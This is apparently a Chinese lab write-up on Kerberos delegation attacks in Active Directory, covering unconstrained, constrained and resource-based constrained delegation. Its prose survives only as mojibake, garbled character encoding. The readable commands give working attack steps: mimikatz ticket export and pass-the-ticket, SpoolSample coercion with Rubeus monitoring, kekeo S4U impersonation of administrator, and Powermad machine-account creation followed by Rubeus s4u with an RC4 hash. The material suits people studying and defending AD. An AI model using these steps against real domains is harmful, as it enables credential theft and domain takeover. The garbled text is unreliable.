å§”æ´¾æ”»å‡»åŸŸå§”æ´¾åŸŸå§”æ´¾æ˜¯ä¸€ç§åŸŸå†…ä¸»æœºçš„è¡Œä¸ºï¼Œä½¿æŸä¸ªæœåŠ¡å¯ä»¥ä»¥è®¿é—®çš„ç”¨æˆ·çš„èº«ä»½å»è®¿é—®å¦å¤–ä¸€ä¸ªæœåŠ¡ã€‚ä¸ºä»€ä¹ˆéœ€è¦åŸŸå§”æ´¾å‘¢ï¼Œæ¯”å¦‚ç°åœ¨æœ‰webæœåŠ¡å™¨å’Œæ–‡ä»¶æœåŠ¡å™¨ï¼Œå½“ç”¨æˆ·Aè®¿é—®webæœåŠ¡å™¨å»è¯·æ±‚æŸä¸ªèµ„æºæ—¶ï¼ŒwebæœåŠ¡å™¨ä¸Šæœ¬èº«å¹¶æ²¡æœ‰è¯¥èµ„æºï¼Œæ‰€ä»¥webæœåŠ¡å™¨å°±ä¼šä»æ–‡ä»¶æœåŠ¡å™¨ä¸Šè°ƒç”¨è¿™ä¸ªèµ„æºï¼Œå…¶ä¸­å‘ç”Ÿçš„è¿‡ç¨‹è‹¥ä»¥åŸŸå§”æ´¾çš„å½¢å¼è¿›è¡Œï¼Œé‚£ä¹ˆå°±æ˜¯ï¼šç”¨æˆ·Aè®¿é—®webæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å†ä»¥ç”¨æˆ·Açš„èº«ä»½å»è®¿é—®æ–‡ä»¶æœåŠ¡å™¨ã€‚å‘ç”ŸåŸŸå§”æ´¾çš„æœåŠ¡ä¸€èˆ¬ä¸ºæœºå™¨è´¦æˆ·å’ŒæœåŠ¡è´¦æˆ·ã€‚åŸŸå§”æ´¾åˆ†ä¸ºä¸‰ç§ï¼šéçº¦æŸæ€§å§”æ´¾ï¼Œçº¦æŸæ€§å§”æ´¾ï¼ŒåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ éçº¦æŸæ€§å§”æ´¾éçº¦æŸæ€§å§”æ´¾çš„åŸç†æ˜¯ï¼šç”¨æˆ·æƒ³è®¿é—®æœåŠ¡Aï¼Œäºæ˜¯å‘KDCæäº¤è®¤è¯ï¼ŒKDCå‘ç°Aæ˜¯éçº¦æŸæ€§å§”æ´¾ï¼Œäºæ˜¯ä¼šæŠŠTGTæ”¾åœ¨STä¸­ä¸€å¹¶ç»™ç”¨æˆ·ã€‚ç„¶åç”¨æˆ·ç”¨è¿™ä¸ªSTå»è®¿é—®æœåŠ¡Aï¼ŒæœåŠ¡Aå°±ç›¸å½“äºè·å¾—äº†ç”¨æˆ·çš„TGTï¼ŒæŠŠTGTæ”¾å…¥lsassè¿›ç¨‹ï¼Œç„¶åå°±å¯ä»¥æ‹¿ç€ç”¨æˆ·çš„TGTä»¥ç”¨æˆ·çš„èº«ä»½å»è®¿é—®æ‰€æœ‰ç”¨æˆ·æƒé™èƒ½å¤Ÿè®¿é—®çš„æœåŠ¡äº†ã€‚ éçº¦æŸæ€§å§”æ´¾çš„å¯ç”¨ï¼š ä¸ºæŸè´¦æˆ·å¯ç”¨ ä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾ä»»ä½•æœåŠ¡ å³å¼€å¯éçº¦æŸæ€§å§”æ´¾ã€‚å¼€å¯ååœ¨è¯¥ç”¨æˆ·çš„ ACLå±æ€§ä¼šå¤šå‡ºä¸€ä¸ª flag : WORKSTATION_TRUSTED_FOR_DELEGATION (å›¾æˆªä¸å®Œï¼Œåæ­£è¿™ä¸ªflagå°±åœ¨ç®­å¤´æ‰€æŒ‡å¤„çš„åé¢) éçº¦æŸå§”æ´¾çš„è®¾ç½®éœ€è¦SeEnableDelegation ç‰¹æƒï¼Œè¯¥ç‰¹æƒé€šå¸¸ä»…æˆäºˆåŸŸç®¡ç†å‘˜è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼ŒåŸŸæ§ä¸»æœºé»˜è®¤æ˜¯éçº¦æŸæ€§å§”æ´¾ çº¦æŸæ€§å§”æ´¾éçº¦æŸæ€§å§”æ´¾æ˜¯å¾ˆä¸å®‰å…¨çš„ï¼ˆå› ä¸ºæ§åˆ¶äº†å¼€å¯éçº¦æŸæ€§å§”æ´¾çš„æœºå™¨ï¼Œå°±ç›¸å½“äºè·å¾—äº†ä¸Šé¢çš„æ‰€æœ‰å…¶ä»–ç”¨æˆ·çš„TGTï¼‰ï¼Œæ‰€ä»¥æ›´å®‰å…¨çš„çº¦æŸæ€§å§”æ´¾è¯ç”Ÿäº†ã€‚çº¦æŸæ€§å§”æ´¾å¤šäº†ä¸¤ä¸ªå§”æ´¾åè®®ï¼ŒS4U2SELF S4U2PROXYï¼Œå¹¶ä¸”é™åˆ¶äº†è¢«è®¾ç½®å§”æ´¾çš„æœåŠ¡çš„è®¿é—®èŒƒå›´ï¼šä»…èƒ½è¢«å§”æ´¾åˆ°è¢«æŒ‡å®šçš„æœåŠ¡ã€‚ çº¦æŸæ€§å§”æ´¾çš„å¤§è‡´æµç¨‹ï¼šç”¨æˆ·è®¿é—®å¼€å¯çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡Aï¼ˆæƒ…å†µä¸€ï¼šæ— S4U2SELFå‚ä¸ï¼‰é¦–å…ˆéœ€è¦ç»è¿‡KDCè®¤è¯ï¼ŒKDCå‘ç°æœåŠ¡Aå¼€å¯äº†çº¦æŸæ€§å§”æ´¾ï¼Œäºæ˜¯åœ¨TGS_RESè¿”å›ç»™ç”¨æˆ·ST1ï¼ˆå¯è½¬å‘STï¼‰ï¼Œç”¨æˆ·æ‹¿ç€ST1è®¿é—®æœåŠ¡Aï¼ŒæœåŠ¡Aå…ˆä¸KDCè¿›è¡Œèº«ä»½éªŒè¯è·å¾—ä¸€ä¸ªæœ‰æ•ˆTGTï¼Œç„¶åæ‹¿ç€ST1ç»è¿‡S4U2PROXYåè®®å‘KDCå‘èµ·TGS_REQï¼ŒKDCè¿”å›ST2ï¼ˆç”¨æˆ·èº«ä»½çš„STï¼‰ï¼Œç„¶åæœåŠ¡Aæ‹¿ç€ST2è®¿é—®æŒ‡å®šæœåŠ¡ã€‚ï¼ˆæƒ…å†µäºŒï¼šæœ‰S4U2SELFå‚ä¸ï¼‰ç”¨æˆ·é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå¦‚NTLMè®¤è¯ï¼Œè¡¨å•è®¤è¯ç­‰ï¼‰è·å–äº†æœåŠ¡Açš„ä¿¡ä»»ï¼Œä½†æ˜¯æ­¤æ—¶æœåŠ¡Aå¹¶æ²¡æœ‰æ¥è‡ªç”¨æˆ·çš„ST1ï¼ŒæŒ‰æƒ…å†µä¸€ä¸­çš„æµç¨‹ï¼ŒæœåŠ¡Aå°±ä¸èƒ½å®Œæˆå§”æ´¾ã€‚æ‰€ä»¥è¿™ä¸ªæ—¶å€™æœåŠ¡Aä¼šä»¥è‡ªå·±çš„èº«ä»½å‘KDCå‘èµ·ç”³è¯·è·å–ä¸€ä¸ªå¯è½¬å‘TGTï¼ˆè·å–KDCä¿¡ä»»ï¼‰ï¼Œç„¶åç”¨è¿™ä¸ªTGTå‘èµ·TGS_REQè·å¾—æŒ‡å®šç”¨æˆ·çš„ST1ï¼Œæ—¢ç„¶è·å–äº†ST1ï¼Œå°±ç»§ç»­æƒ…å†µä¸€ä¸­çš„æµç¨‹å³å¯äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´S4U2SELFæ˜¯ç”¨æˆ·é€šè¿‡ékerberosåè®®å®Œæˆè®¤è¯çš„æƒ…å†µä¸‹ï¼Œè‡ªåŠ¨å‘KDCè·å–ST1çš„ä¸€ä¸ªåè®®ã€‚è€ŒS4U2PROXYåˆ™æ˜¯å°†ST1å‘ç»™KDCï¼Œä½¿å…¶å˜ç°ä¸ºæˆè‡ªå·±å¯ç”¨çš„ ST2 çš„ä¸€ä¸ªåè®®ã€‚ å¯ç”¨æ–¹æ³•: å…¶ä¸­è¢«æ·»åŠ çš„æœåŠ¡åˆ™æ˜¯å…è®¸è¢«å§”æ´¾åˆ°çš„æœåŠ¡ è‹¥å¯ç”¨çš„æ˜¯ ä»…ä½¿ç”¨kerberosï¼Œé‚£ä¹ˆuseraccountcontrolå±æ€§ä»…æœ‰ workstation_trust_account.è‹¥å¯ç”¨ä»»ä½•èº«ä»½éªŒè¯åè®®ï¼Œå°±ä¼šæœ‰ TrustedToAuthenticationForDelegation åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾Windows Server 2012ä¸­å¼•å…¥äº†åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚ åªèƒ½åœ¨è¿è¡ŒWindows Server 2012æˆ–Windows Server 2012 R2åŠä»¥ä¸Šçš„åŸŸæ§åˆ¶å™¨ä¸Šé…ç½®åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼Œä¸éœ€è¦åŸŸç®¡ç†å‘˜å‰æ¥è®¾ç½®ï¼Œè€ŒæŠŠè®¾ç½®å§”æ´¾çš„æƒé™äº¤ç»™äº†è‡ªèº«ã€‚å…¶å®å°±æ˜¯å¯ä»¥æ‘†è„±åŸŸæ§æ¥ä¸»åŠ¨è®¾ç½®è‡ªå·±å¯ä»¥è¢«å“ªäº›è´¦æˆ·å§”æ´¾è®¿é—®ã€‚ éçº¦æŸæ€§å§”æ´¾æ”»å‡»éçº¦æŸæ€§å§”æ´¾æœ‰å·¨å¤§çš„å®‰å…¨é—®é¢˜ï¼Œä¸Šé¢æˆ‘ä»¬è¯´è¿‡ï¼Œéçº¦æŸæ€§å§”æ´¾çš„å®è´¨å°±æ˜¯æŠŠç”¨æˆ·çš„TGTå­˜å…¥lassaè¿›ç¨‹ï¼Œä»è€Œæ¨¡æ‹Ÿç”¨æˆ·èº«ä»½è¿›è¡Œå„ç§å§”æ´¾è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€æ§åˆ¶éçº¦æŸæ€§å§”æ´¾æ”»å‡»çš„æœºå™¨ï¼Œç„¶ådumpå‡ºæ‰€æœ‰çš„ç¥¨æ®ï¼Œå°±ç›¸å½“äºè·å¾—äº†æ‰€æœ‰ç»è¿‡è¯¥æœåŠ¡è¿›è¡Œçº¦æŸæ€§å§”æ´¾çš„ç”¨æˆ·çš„èº«ä»½äº†ã€‚ 1.è¿›è¡Œéçº¦æŸæ€§å§”æ´¾è´¦æˆ·æ‰«æè¿™é‡Œæä¸€ä¸‹æ€ä¹ˆåˆ›å»ºæœ‰SPNçš„æœåŠ¡è´¦æˆ·ã€‚åªéœ€å†åŸŸæ§é‡Œæ‰§è¡Œ setspn -U -A spn_type username å³å¯å…¶ä¸­spn_typeå³SPNçš„æ ¼å¼ï¼š MSSQLSvc/:[ | ] MSSQLSvc æ˜¯è¦æ³¨å†Œçš„æœåŠ¡ã€‚ æ˜¯æœåŠ¡å™¨çš„å®Œå…¨é™å®šåŸŸåã€‚ æ˜¯ TCP ç«¯å£å·ã€‚ æ˜¯ SQL Server å®ä¾‹çš„åç§°ã€‚ è¿™é‡Œæˆ‘ä»¬éšä¾¿è¾“ä¸€ä¸ªï¼Œæ¯”å¦‚ sb/caonima è¿™ç§éƒ½è¡Œ. è¿™é‡Œé‡‡ç”¨powersploitä¸‹çš„powerview.ps1æ ¹æ®æˆ‘ç½‘ä¸Šå¾ˆå¤šæœç´¢ç»“æœï¼ŒæŸ¥æ‰¾éçº¦æŸå§”æ´¾æœåŠ¡è´¦æˆ·åªéœ€è°ƒç”¨Get-NetUser -Unconstrained -Domain de1ay.comè¿™ä¸ªå‘½ä»¤å³å¯ï¼Œä½†æ˜¯æˆ‘ä¸‹è½½ä¸‹æ¥çš„powerviewé‡Œçš„get-netuseré‡Œå´æ²¡æœ‰unconstrainedå‚æ•°ï¼Œå¾ˆçƒ¦ã€‚æ‰€ä»¥ç”¨ä¸€ä¸ªæ¯”è¾ƒåŸå§‹çš„æ–¹æ³•æ¥åˆ¤åˆ«ï¼ˆé€‚åˆåœ¨ç”¨æˆ·å°‘çš„æƒ…å†µä¸‹ï¼‰ç›´æ¥è°ƒç”¨ Get-NetUser -SPN æ‰¾åˆ°æ‰€æœ‰æœåŠ¡è´¦æˆ·æˆ–è€…Get-domaincomputeræ‰¾åˆ°æ‰€æœ‰æœºå™¨è´¦æˆ·ï¼Œç„¶ååˆ¤æ–­å…¶useraccountcontrlé‡Œæœ‰æ²¡æœ‰trusted_for_delegation,è‹¥æœ‰ï¼Œåˆ™è¯´æ˜å¼€å¯äº†éçº¦æŸæ€§å§”æ´¾ æŸ¥è¯¢éçº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·åˆ™ç”¨Get-domaincomputer -unconstrained -domain const.com 2.éçº¦æŸæ€§å§”æ´¾çš„æ”»å‡»ä»…èƒ½åŸºäºæœºå™¨è´¦æˆ· å¦‚æœæˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªéçº¦æŸæ€§å§”æ´¾è´¦æˆ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¶é›†å†…å­˜ä¸­çš„tgtè¾¾åˆ°ä»»æ„ç”¨æˆ·è®¿é—®çš„ç›®çš„ã€‚ åœ¨è¢«æ§åˆ¶çš„éçº¦æŸæ€§å§”æ´¾æœºå™¨ä¸Šä½¿ç”¨mimikatzã€‚privilege::debugææƒsekurlsa::tickets æŸ¥çœ‹æœ¬æœºæ‰€æœ‰ç¥¨æ® é€šè¿‡ä»¥ä¸Šå‘½ä»¤è·å–ç¥¨æ®,å¦‚æœç®¡ç†å‘˜è®¿é—®äº†æœ¬æœºçš„ä¸€äº›æœåŠ¡ï¼Œé‚£ä¹ˆå®ƒçš„TGTå°±ä¼šè¢«æˆªè·æ”¾å…¥å†…å­˜ã€‚ æˆ‘ä»¬æ¨¡æ‹Ÿç®¡ç†å‘˜è°ƒç”¨éçº¦æŸæ€§å§”æ´¾æœºçš„smbæœåŠ¡ æˆ‘ä»¬å›åˆ°éçº¦æŸå§”æ´¾æœºï¼ŒæŸ¥çœ‹ç¥¨æ® tgtè¢«æˆªè·,æˆ‘ä»¬ç”¨ sekurlas::tickets /export æŠŠç¥¨æ®å¯¼å‡ºæ¥ ç„¶åmimikatzé‡Œä½¿ç”¨kerberos::ptt ç¥¨æ®æ–‡ä»¶å å°†ç¥¨æ®æ³¨å…¥å†…å­˜è®¿é—®åŸŸæ§c$ æˆåŠŸ 3.éçº¦æŸæ€§å§”æ´¾é…åˆ Spooleræ‰“å°æœºæœåŠ¡çº¯éçº¦æŸæ€§å§”æ´¾æ”»å‡»å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¿…é¡»è¦å…¶ä»–ç”¨æˆ·é€šè¿‡ä½ è¿›è¡Œå§”æ´¾è®¿é—®ã€‚ä½†æ˜¯ ï¼šåˆ©ç”¨Windowsæ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®ï¼ˆMS-RPRNï¼‰ä¸­çš„ä¸€ç§æ—§çš„ä½†æ˜¯é»˜è®¤å¯ç”¨çš„æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼ŒåŸŸç”¨æˆ·å¯ä»¥ä½¿ç”¨MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationï¼ˆExï¼‰æ–¹æ³•å¼ºåˆ¶ä»»ä½•è¿è¡Œäº†SpooleræœåŠ¡çš„è®¡ç®—æœºä»¥é€šè¿‡Kerberosæˆ–NTLMå¯¹æ”»å‡»è€…é€‰æ‹©çš„ç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚ é…åˆéçº¦æŸæ€§å§”æ´¾æ”»å‡»ï¼Œç®€ç›´çˆ†ç‚¸ï¼Œå¯ä»¥ä¸»åŠ¨æ‹¿åˆ°å…¶ä»–ç”¨æˆ·çš„TGTã€‚-è€Œä¸”splooeræœåŠ¡æ˜¯é»˜è®¤è¿è¡Œçš„ã€‚ï¼ˆå›¾æºWIN7ï¼‰ ä½¿å…¶ä»–ä¸»æœºå¼ºè¡Œä¸è‡ªå·±å‘ç”Ÿèº«ä»½éªŒè¯çš„è„šæœ¬ï¼šéœ€è¦è‡ªå·±ç¼–è¯‘ä¸€ä¸‹https://github.com/leechristensen/SpoolSample.git åœ¨æ­¤ä¹‹å‰éœ€è¦å¼€å¯ç›‘å¬æ¥è‡ªå…¶ä»–ä¸»æœºçš„TGTï¼Œè¿™é‡Œç”¨çš„æ˜¯rubeusRubeus.exe monitor /interval:1 /filteruser:xx ç„¶åä½¿ç”¨SpoolSample.exe XX win7,è®©æŒ‡å®šæœºå™¨è®¿é—®WIN7è¿›è¡Œèº«ä»½éªŒè¯ ç„¶åè·å¾—TGTï¼Œä¸‹ç­ã€‚ çº¦æŸæ€§å§”æ´¾çš„æ”»å‡»çº¦æŸæ€§å§”æ´¾çš„å¤§è‡´æ”»å‡»æµç¨‹æ˜¯: (åˆ©ç”¨S4U2SELF=&gt;)å¦‚æœæˆ‘ä»¬è·å¾—äº†çº¦æŸæ€§å§”æ´¾æœºçš„NTLM hashæˆ–è€…æ˜æ–‡å¯†ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»¥æ­¤æ¥å‘KDCå‘é€ä¸€ä¸ªTGTç”³è¯·ï¼Œè·å¾—ä¸€ä¸ªå¯è½¬å‘çš„TGTã€‚ç„¶åç”¨è¿™ä¸ªå¯è½¬å‘çš„TGTè°ƒç”¨S4U2SELFåè®®ï¼Œè·å¾—ä¸€ä¸ªé’ˆå¯¹è‡ªå·±çš„ST1ç¥¨æ®ï¼ˆå…¶ä¸­ST1ç¥¨æ®ä¸­çš„è¯·æ±‚ç”¨æˆ·å¯ä»¥ä»»æ„ä¼ªé€ ï¼‰.ç„¶åç”¨è¿™ä¸ªST1ç¥¨æ®å»å‘KDCè¯·æ±‚ST2ï¼Œç„¶åç”¨ST2å»è®¿é—®æœåŠ¡ï¼Œæ­¤æ—¶æˆ‘ä»¬è®¿é—®çš„èº«ä»½å°±æ˜¯æˆ‘ä»¬ä»»æ„ä¼ªé€ çš„èº«ä»½äº†. é‡ç‚¹æ˜¯åªè¦è·å¾—äº†å¯è½¬å‘TGTï¼Œçº¦æŸæ€§å§”æ´¾æœºå°±å¯ä»¥ä»»æ„ä¼ªé€ å…¶ä»–ç”¨æˆ·çš„ST1ç¥¨æ®è¯·æ±‚ï¼Œå¤ªå¯æ€•äº†ã€‚ è¿™ä¸ªæ”»å‡»çš„æœ€å¤§å‰ææ˜¯æˆ‘ä»¬å¾—è·å¾—çº¦æŸæ€§å§”æ´¾è´¦æˆ·çš„NTLM HASHæˆ–è€…æ˜æ–‡å¯†ç ,ç„¶åæˆ‘ä»¬æ‰èƒ½æˆåŠŸçš„å¾—åˆ°å¯è½¬å‘TGTï¼Œç„¶åæ‰èƒ½å¾—åˆ°æ¥ä¸‹æ¥çš„ä¸€åˆ‡ã€‚ é¦–å…ˆé…ç½®å¥½çº¦æŸæ€§å§”æ´¾è´¦æˆ· æ³¨æ„é€‰ç”¨ ä½¿ç”¨ä»»ä½•èº«ä»½éªŒè¯åè®® æˆ‘ä»¬å…ˆä¿¡æ¯æœé›†ï¼šçœ‹å“ªäº›ç”¨æˆ·æ˜¯å¼€å¯çº¦æŸæ€§å§”æ´¾çš„ã€‚ä¸€æ‰‹powerviewå®‰æ’ä¸Š ç®­å¤´æŒ‡å‡ºçš„åœ°æ–¹å°±æ˜¯å¯ä»¥è¢«å§”æ´¾è®¿é—®çš„æœåŠ¡ æˆ‘ä»¬ç”¨kekeoæ¥å®ç°æ”»å‡». tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbiè¿™é‡Œçš„&#x2F;passwordå¯ä»¥æ”¹æˆ&#x2F;NTLM:xxè·å¾—TGTè½¬å‘ç¥¨æ®tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DCtgtå¤„æ”¹ä¸ºåˆšåˆšå¾—åˆ°çš„TGTæ–‡ä»¶çš„åå­—ï¼Œè¿™ä¸ªå‘½ä»¤æ‰§è¡Œåå¾—åˆ°administratorèº«ä»½çš„ ST2 æŠŠæœ€åè·å¾—çš„ç¥¨æ®ç”¨mimikatz kerberos::ptt æ³¨å…¥å†…å­˜ï¼Œå®Œäº‹ã€‚ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾refer:https://xz.aliyun.com/t/7454 åŸç†çš„å‡ ä¸ªç‚¹ï¼š1.S4U2SELF åè®®å¯ä»¥åœ¨ç”¨æˆ·æ²¡æœ‰é…ç½® TrustedToAuthenticationForDelegation å±æ€§ï¼ˆå³å¼€å¯ä½¿ç”¨ä»»ä½•åè®®è®¤è¯çš„çº¦æŸæ€§å§”æ´¾ï¼‰æ—¶è¢«è°ƒç”¨ï¼Œä½†æ˜¯è¿”å›çš„STæ˜¯ä¸å¯è¢«è½¬å‘çš„ã€‚2.åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä¸»æœº åœ¨è¢«å¦ä¸€å°ä¸»æœºå§”æ´¾è®¿é—®æ—¶ï¼Œåœ¨S4U2PROXYè¿‡ç¨‹ä¸­æäº¤è¿‡æ¥çš„STå¦‚æœå³ä½¿æ˜¯ä¸å¯è½¬å‘çš„ã€‚KDCä¾æ—§ä¼šè¿”å›æœ‰æ•ˆçš„ST2ã€‚3.æ¯ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥åˆ›å»ºè‡³å¤šåä¸ªæœºå™¨è´¦æˆ·ï¼ˆ ç”±MachineAccountQuotaå±æ€§å†³å®š ï¼‰ï¼Œæ¯ä¸ªæœºå™¨è´¦æˆ·è¢«åˆ›å»ºæ—¶éƒ½ä¼šè‡ªåŠ¨æ³¨å†ŒSPN: RestrictedKrbHost/domainå’ŒHOST/domainè¿™ä¸¤ä¸ªSPN æ”»å‡»æµç¨‹:å‡è®¾å¼€å¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æœºå™¨ä¸ºA1.é¦–å…ˆè¦æœ‰ä¸€ä¸ªå¯¹å½“å‰è®¡ç®—æœºæœ‰å†™æƒé™çš„è´¦æˆ·ï¼Œæ‰èƒ½å¯¹Aè®¾ç½®å¯ä»¥ è¢« å§”æ´¾è®¿é—®çš„æœåŠ¡è´¦æˆ·ã€‚2.åˆ©ç”¨å½“å‰è´¦æˆ·åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶é…ç½®å¥½æœºå™¨è´¦æˆ·åˆ°Açš„ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾3.å› ä¸ºæœºå™¨è´¦æˆ·æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„å¯†ç è´¦æˆ·ï¼Œå¯ä»¥è®©å®ƒåˆ©ç”¨S4U2SELFåè®®è·å¾—ä¸€ä¸ªä¸å¯è½¬å‘STã€‚ç„¶åç”¨è¿™ä¸ªä¸å¯è½¬å‘STé€šè¿‡S4U2PROXYï¼Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åŸºç¡€ä¸Šè·å¾—æœ‰æ•ˆçš„è®¿é—®A cifsæœåŠ¡çš„ST2ã€‚4.ç”¨ST2è®¿é—®Açš„CIFSæœåŠ¡ï¼Œæƒé™è·å¾—ã€‚ å®æ“è¿™ä¸ªæ”»å‡»è¯´ç™½äº†å°±æ˜¯ä¸ªææƒâ€¦ é¦–å…ˆæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸŸæ§æ˜¯å¦æ˜¯win2012ä»¥ä¸Šçš„ä¸»æœºï¼Œå› ä¸ºåªæœ‰è¿™æ ·æ‰èƒ½å¼€å¯ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚ æˆ‘ä»¬ä½¿ç”¨powersploitä¸‹çš„powerviewè„šæœ¬ã€‚æ‰§è¡Œå‘½ä»¤ get-netdomaincontroller å¯ä»¥è·å¾—åŸŸæ§WINç‰ˆæœ¬ ç„¶åæˆ‘ä»¬æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹å“ªå°ä¸»æœºæœ‰å†™æƒé™ã€‚å› ä¸ºæ˜¯å®éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ€ä¹ˆé…ç½®ä¸€ä¸ªç”¨æˆ·å¯¹ä¸€ä¸ªæœºå™¨çš„æƒé™ã€‚ç›´æ¥åœ¨åŸŸæ§ä¸Šæ‰¾åˆ°æŸä¸»æœºï¼Œç„¶åè¿›å…¥åœ¨å±æ€§é‡Œè¿›å…¥å®‰å…¨é€‰é¡¹å¡ï¼Œæ·»åŠ æŸç”¨æˆ·ï¼Œç„¶åç»™è¿™ä¸ªç”¨æˆ·åˆ†é…æƒé™å³å¯ã€‚ æˆ‘ä»¬ä¾æ—§ä½¿ç”¨powerviewã€‚å…ˆè°ƒç”¨Get-DomainUser -Identity username -Properties objectsidæ¥è·å–å½“å‰ç”¨æˆ·SIDç„¶åGet-DomainObjectAcl -Identity ä¸»æœºå | ?&#123;$_.SecurityIdentifier -match &quot;åˆšåˆšå¾—åˆ°çš„SID&quot;&#125; æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ã€‚ å¦‚æœæœ‰ GenericAllï¼ˆå®Œå…¨æ§åˆ¶æƒï¼‰ï¼ŒGenericWriteã€WritePropertyã€WriteDacl è¿™äº›å±æ€§ï¼Œå°±è¯´æ˜è¯¥ç”¨æˆ·èƒ½ä¿®æ”¹è®¡ç®—æœºçš„è´¦æˆ·å±æ€§ã€‚å¦‚å›¾çœ‹åˆ°æˆ‘ä»¬å¯¹WIN7è¿›è¡Œæ“ä½œ å¥½çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦åˆ›ç«‹ä¸€ä¸ªæœºå™¨ç”¨æˆ·äº†ã€‚æ ¹æ®ç½‘ä¸Šæœç´¢ç»“æœï¼Œä½¿ç”¨powermadè¿™ä¸ªpsè„šæœ¬å¯ä»¥å¾ˆå¿«æ·çš„åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ·ã€‚https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force) å¥½çš„ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯†ç hackï¼Œåä¸ºhacksystemçš„æœºå™¨è´¦æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½®hacksystemåˆ°WIN7çš„å§”æ´¾äº†ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œæ˜¯ä¿®æ”¹WIN7çš„ msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§çš„å€¼ ï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬ç”¨powerviewå®ç°ã€‚ $SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot; #è¿™å„¿çš„sidæ˜¯æˆ‘ä»¬åˆ›å»ºçš„#æœºå™¨ç”¨æˆ·#evilsystemçš„sid$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose è‡³äºæœºå™¨è´¦æˆ·SIDæ€ä¹ˆè·å¾—ï¼Œpowerviewä¸‹çš„ get-domiancomputer hacksystemç„¶åä½¿ç”¨Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity æŸ¥çœ‹å§”æ´¾æ˜¯å¦è®¾ç½®æˆåŠŸ Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose æ­¤å‘½ä»¤å¯ä»¥æ¸…é™¤ msds-allowedtoactonbehalfofotheridentityå±æ€§çš„å€¼ ç°åœ¨éƒ½ç»Ÿç»Ÿè®¾ç½®å¥½äº†ï¼Œå¼€å§‹ä¸‹ä¸€æ­¥å§ã€‚ç½‘ä¸Šä¸€èˆ¬ç”¨çš„rubeusï¼Œè¿™é‡Œæˆ‘ç”¨kekeoå§ Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx æœ¬åœ°è¿ç®—å‡ºæœºå™¨ç”¨æˆ·ntlm hash è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„å›¾ Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt å†™å…¥ç¥¨æ® ç„¶åæˆ‘åœ¨æœ¬æœºä½¿ç”¨ä»¥ä¸Šæ–¹æ³•åklistä¸€ä¸‹ï¼Œå‘ç°ç¡®å®å­˜åœ¨ç¥¨æ® ä½†æ˜¯dir \\test1\\c$æ—¶æœ¬æœºè«åå…¶å¦™ä¸èƒ½è¿›è¡ŒkerberoséªŒè¯ï¼Œæˆ‘æœäº†ã€‹ã€‚ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œæˆ‘ä»¬æ‹¿åˆ°é“¶ç¥¨äº† æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡ 